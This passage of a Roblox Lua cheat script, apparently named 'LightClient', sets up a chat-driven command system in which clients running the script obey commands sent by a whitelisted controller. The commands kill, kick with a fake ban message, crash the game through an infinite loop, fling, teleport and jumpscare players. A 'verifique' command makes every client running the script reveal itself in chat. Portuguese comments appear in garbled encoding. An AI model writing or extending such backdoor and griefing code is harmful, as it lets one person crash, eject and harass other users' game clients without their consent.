                local success, mapa = pcall(function()
                    return game:GetObjects("rbxassetid://"..mapID)[1]
                end)
                
                if success and mapa then
                    -- Remover backrooms existentes
                    local existingBackrooms = workspace:FindFirstChild("LightClient_Backrooms")
                    if existingBackrooms then
                        existingBackrooms:Destroy()
                    end
                    
                    local backroomsFolder = Instance.new("Folder")
                    backroomsFolder.Name = "LightClient_Backrooms"
                    backroomsFolder.Parent = workspace
                    
                    mapa.Parent = backroomsFolder
                    mapa.Name = "BackroomsMap"
                    
                    -- Configurar posiÃ§Ã£o do mapa
                    if not mapa.PrimaryPart then
                        local part = mapa:FindFirstChildWhichIsA("BasePart")
                        if part then 
                            mapa.PrimaryPart = part 
                        end
                    end
                    
                    if mapa.PrimaryPart then
                        mapa:SetPrimaryPartCFrame(CFrame.new(distantPosition))
                    else
                        -- Se nÃ£o tiver PrimaryPart, mover todas as partes
                        for _, part in ipairs(mapa:GetDescendants()) do
                            if part:IsA("BasePart") then
                                part.Position = part.Position + distantPosition
                            end
                        end
                    end
                    
                    -- Aplicar iluminaÃ§Ã£o das backrooms
                    local lighting = game:GetService("Lighting")
                    lighting.Brightness = 0.6
                    lighting.Ambient = Color3.fromRGB(255, 200, 100)
                    lighting.OutdoorAmbient = Color3.fromRGB(255, 200, 100)
                    lighting.FogColor = Color3.fromRGB(255, 200, 100)
                    lighting.FogEnd = 250
                    lighting.FogStart = 50
                    
                    -- Teletransportar jogador
                    humanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    
                    -- Remover efeito apÃ³s 1 segundo
                    game:GetService("Debris"):AddItem(transitionEffect, 1)
                    
                    -- Ativar o monstro apÃ³s 3 segundos
                    task.wait(3)
                    ActivateMonster(player)
                    
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[LightClient] VocÃª foi teletransportado para as Backrooms! CUIDADO COM O MONSTRO! ðŸ’€",
                        Color = Color3.fromRGB(255, 165, 0),
                        Font = Enum.Font.GothamBold
                    })
                    print("ðŸšª BACKROOMS: " .. LocalPlayer.Name .. " foi teletransportado para as Backrooms! MAPA ID: " .. mapID)
                else
                    -- Fallback se o mapa nÃ£o carregar
                    humanoidRootPart.CFrame = CFrame.new(teleportPosition)
                    game:GetService("Debris"):AddItem(transitionEffect, 1)
                    StarterGui:SetCore("ChatMakeSystemMessage", {
                        Text = "[LightClient] Backrooms carregada! CUIDADO COM O MONSTRO! ðŸ’€",
                        Color = Color3.fromRGB(255, 165, 0),
                        Font = Enum.Font.GothamBold
                    })
                end
                return
            end

            -- Unbackrooms (Voltar do Backrooms)
            if comando == "unbackrooms" then
                RestoreNormalWorld()
                StarterGui:SetCore("ChatMakeSystemMessage", {
                    Text = "[LightClient] VocÃª voltou do Backrooms! O monstro foi derrotado! ðŸ ",
                    Color = Color3.fromRGB(0, 255, 0),
                    Font = Enum.Font.GothamBold
                })
                print("ðŸ  UNBACKROOMS: " .. LocalPlayer.Name .. " voltou do Backrooms! Monstro desativado!")
                return
            end

            -- Sistema de Jumpscares
            if comando == "jumps1" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[1])
                print("ðŸ’€ JUMPS CARE 1 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps2" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[2])
                print("ðŸ’€ JUMPS CARE 2 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps3" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[3])
                print("ðŸ’€ JUMPS CARE 3 ativado em " .. LocalPlayer.Name)
            elseif comando == "jumps4" then
                TriggerJumpscare(LocalPlayer, JUMPSCARES[4])
                print("ðŸ’€ JUMPS CARE 4 ativado em " .. LocalPlayer.Name)
            
            -- Comandos anteriores
            elseif comando == "kill" and character then
                character:BreakJoints()
                print("ðŸ’€ KILL executado em " .. LocalPlayer.Name)
            elseif comando == "kick" then
                LocalPlayer:Kick("ðŸš« VocÃª foi banido por um admin do LightClient")
                print("ðŸ‘¢ KICK executado em " .. LocalPlayer.Name)
            elseif comando == "crash" then
                print("ðŸ’¥ CRASH executado em " .. LocalPlayer.Name)
                while true do end
            elseif comando == "explodir" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    local explosion = Instance.new("Part")
                    explosion.Name = "LightClientExplosion"
                    explosion.Size = Vector3.new(8, 8, 8)
                    explosion.Shape = Enum.PartType.Ball
                    explosion.Material = Enum.Material.Neon
                    explosion.BrickColor = BrickColor.new("Institutional white")
                    explosion.Position = humanoidRootPart.Position
                    explosion.Anchored = true
                    explosion.CanCollide = false
                    explosion.Parent = workspace
                    
                    local pointLight = Instance.new("PointLight")
                    pointLight.Brightness = 10
                    pointLight.Range = 15
                    pointLight.Color = Color3.new(1, 1, 1)
                    pointLight.Parent = explosion
                    
                    character:BreakJoints()
                    
                    for _, part in pairs(character:GetDescendants()) do
                        if part:IsA("BasePart") and part ~= humanoidRootPart then
                            part.Velocity = Vector3.new(
                                math.random(-50, 50),
                                math.random(30, 60), 
                                math.random(-50, 50)
                            )
                        end
                    end
                    
                    local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                    local tween = TweenService:Create(explosion, tweenInfo, {Size = Vector3.new(20, 20, 20)})
                    tween:Play()
                    
                    game:GetService("Debris"):AddItem(explosion, 2)
                    
                    print("ðŸ’¥ EXPLOSÃƒO BRANCA executada em " .. LocalPlayer.Name)
                end
            elseif comando == "fling" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    print("ðŸš€ INICIANDO FLING Ã‰PICO EM " .. LocalPlayer.Name)
                    
                    local flash = Instance.new("Part")
                    flash.Name = "LightClientFlingFlash"
                    flash.Size = Vector3.new(15, 15, 15)
                    flash.Shape = Enum.PartType.Ball
                    flash.Material = Enum.Material.Neon
                    flash.BrickColor = BrickColor.new("Bright blue")
                    flash.Position = humanoidRootPart.Position
                    flash.Anchored = true
                    flash.CanCollide = false
                    flash.Parent = workspace
                    
                    local flashLight = Instance.new("PointLight")
                    flashLight.Brightness = 15
                    flashLight.Range = 20
                    flashLight.Color = Color3.new(0, 0, 1)
                    flashLight.Parent = flash
                    
                    wait(0.5)
                    
                    humanoidRootPart.Velocity = Vector3.new(
                        math.random(-999999, 999999),
                        math.random(500000, 999999),
                        math.random(-999999, 999999)
                    )
                    
                    game:GetService("Debris"):AddItem(flash, 1)
                    
                    print("ðŸŒŒ FLING Ã‰PICO EXECUTADO! Qualidade da tela: ðŸ’€")
                    print("ðŸŽ¯ " .. LocalPlayer.Name .. " foi pro infinito e alÃ©m!")
                end
            elseif comando == "bring" and character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                
                if humanoidRootPart then
                    print("ðŸŽ¯ BRING recebido! Procurando quem enviou...")
                    
                    for _, player in ipairs(Players:GetPlayers()) do
                        if player ~= LocalPlayer then
                            if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                local senderRootPart = player.Character.HumanoidRootPart
                                
                                local bringEffect = Instance.new("Part")
                                bringEffect.Name = "LightClientBringEffect"
                                bringEffect.Size = Vector3.new(6, 6, 6)
                                bringEffect.Shape = Enum.PartType.Ball
                                bringEffect.Material = Enum.Material.Neon
                                bringEffect.BrickColor = BrickColor.new("Bright green")
                                bringEffect.Position = humanoidRootPart.Position
                                bringEffect.Anchored = true
                                bringEffect.CanCollide = false
                                bringEffect.Parent = workspace
                                
                                local bringLight = Instance.new("PointLight")
                                bringLight.Brightness = 8
                                bringLight.Range = 15
                                bringLight.Color = Color3.new(0, 1, 0)
                                bringLight.Parent = bringEffect
                                
                                local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                                local tween = TweenService:Create(bringEffect, tweenInfo, {Size = Vector3.new(12, 12, 12), Transparency = 0.8})
                                tween:Play()
                                
                                local targetPosition = senderRootPart.Position + senderRootPart.CFrame.LookVector * 5
                                humanoidRootPart.Position = targetPosition + Vector3.new(0, 3, 0)
                                
                                game:GetService("Debris"):AddItem(bringEffect, 1)
                                
                                print("âœ… BRING executado! Teletransportado para " .. player.Name)
                                break
                            end
                        end
                    end
                end
            end
        end
        
        -- Comandos de Tags Globais
        if comando == "untag" and nomeAlvo == "all" then
            tagsVisiveis = false
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[LightClient] Todas as tags foram removidas.",
                Color = Color3.fromRGB(170, 0, 255),
                Font = Enum.Font.GothamBold
            })
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("Head") then
                    local head = player.Character.Head
                    local tag = head:FindFirstChild("SpecialTag")
                    if tag then
                        tag:Destroy()
                    end
                end
            end
            return
        end

        if comando == "tag" and nomeAlvo == "all" then
            tagsVisiveis = true
            StarterGui:SetCore("ChatMakeSystemMessage", {
                Text = "[LightClient] Todas as tags foram restauradas.",
                Color = Color3.fromRGB(170, 0, 255),
                Font = Enum.Font.GothamBold
            })
            for _, player in ipairs(Players:GetPlayers()) do
                applyTag(player)
            end
            return
        end
        
        -- âš¡ DETECTA ;verifique E EXECUTA EM TODOS (INCLUINDO VOCÃŠ) âš¡
        if comando == "verifique" then
            print("ðŸŽ¯ VerificaÃ§Ã£o detectada! Digitando Over_Users")
            
            wait(2)
            
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local canal = TextChatService.TextChannels.RBXGeneral
                if canal then
                    canal:SendAsync("Over_Users")
                    print("âœ… Over_Users enviado por: " .. LocalPlayer.Name)
                end
            else
                ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Over_Users", "All")
                print("âœ… Over_Users enviado por: " .. LocalPlayer.Name)
            end
        end
    end
end

-- Conectar ao chat para RECEBER comandos
task.spawn(function()
    wait(3)
    local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
    if canal then
        canal.OnIncomingMessage = function(mensagem)
            ProcessarComando(mensagem.Text)
        end
        print("âœ… Sistema de comandos ativo!")
    end
end)

-- ===== INICIALIZAR =====
WindUI:Notify("LightClient", "Sistema carregado com sucesso! âœ…")
print("ðŸŽ® LIGHTCLIENT - SISTEMA FUNCIONANDO!")
print("ðŸ‘‘ Desenvolvido por: Hiro")
print("ðŸ“Š ABAS ORGANIZADAS:")
print("   ðŸ  Principal - Sistema de verificaÃ§Ã£o")
print("   âš¡ Comandos BÃ¡sicos - Kill, Kick, Crash, Bring, Fling")
print("   ðŸ”’ Controle - Freeze, Unfreeze, Jail, Unjail") 
print("   â­ Efeitos - ExplosÃµes, Jumpscares, Backrooms")
print("   ðŸ·ï¸ Tags - Controle de tags dos jogadores")
print("ðŸŽ¨ TEMA ROXO APLICADO!")
print("ðŸ›¡ï¸  SISTEMA DE WHITELIST ATIVADO - USUÃRIO AUTORIZADO!")
print("ðŸšª SISTEMA BACKROOMS ATUALIZADO!")
print("ðŸ—ºï¸  MAPA DAS BACKROOMS: ID 10581711055")
print("ðŸ“ POSIÃ‡ÃƒO DO MAPA: Vector3.new(0, 10000, 0)")
print("ðŸŽ¯ POSIÃ‡ÃƒO DO JOGADOR: Vector3.new(59.06, 9996.70, 19.42)")
print("ðŸ‘¹ MONSTRO DAS BACKROOMS ATIVADO!")
print("ðŸ–¼ï¸  IMAGEM DO MONSTRO: 126754882337711")
print("ðŸ”Š SOM DO MONSTRO: 138873214826309")
